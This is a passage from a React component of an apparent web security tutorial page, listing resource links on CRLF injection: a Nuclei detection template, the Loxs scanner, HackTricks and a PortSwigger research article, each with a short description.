                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-amber-500">CRLF Nuclei Template</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Custom Nuclei template for mass CRLF injection detection</p>
                </div>
              </a>
              <a href="https://github.com/coffinxp/loxs" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
                  <Zap className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-amber-500">Loxs</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Mass CRLF and time-based SQLi scanning tool</p>
                </div>
              </a>
              <a href="https://book.hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
                  <BookOpen className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-amber-500">HackTricks CRLF</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Comprehensive CRLF injection reference and payloads</p>
                </div>
              </a>
              <a href="https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-amber-500/50 hover:shadow-lg hover:shadow-amber-500/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-amber-500/10 text-amber-500">
                  <Globe className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-amber-500">PortSwigger Research</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Making HTTP Header Injection Critical via Response Queue Poisoning</p>
                </div>
              </a>
            </div>
          </section>

    </ContentLayout>
  )
}
